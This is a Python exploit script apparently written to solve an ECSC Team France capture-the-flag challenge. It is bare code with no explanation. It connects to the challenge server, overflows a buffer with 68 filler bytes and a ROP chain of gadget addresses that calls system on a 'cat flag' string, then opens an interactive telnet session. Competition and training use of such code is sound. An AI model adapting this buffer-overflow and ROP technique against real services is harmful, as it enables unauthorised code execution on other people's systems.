# CTF ESCSC_TeamFrance 
#!/usr/bin/python
import struct
import socket
import sys
from telnetlib import Telnet
from pwn import *
from struct import pack


host ="challenges.ecsc-teamfrance.fr"
port = 4004

cat_flag_addr = 0x000733fc
system_addr = 0x000104ec

def exploit(payload):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((host, port))
    data = server.recv(1024)

    server.send(payload + "\n")

    #data = server.recv(1024)

    print "[*] Starting"
    t = Telnet()
    t.sock = server
    t.interact()

    server.close()

def create_payload():
    payload = "A"*68
    return payload


def insert_gadgets(payload):
    payload += struct.pack("<I", 0x000703c8)
    payload += struct.pack("<I", cat_flag_addr)
    payload += struct.pack("<I", system_addr)
    payload += struct.pack("<I", 0xFFFFFFFF)
    payload += struct.pack("<I", 0xFFFFFFFF)
    payload += struct.pack("<I", 0xFFFFFFFF)
    
    return payload


payload = insert_gadgets(create_payload())

exploit(payload)


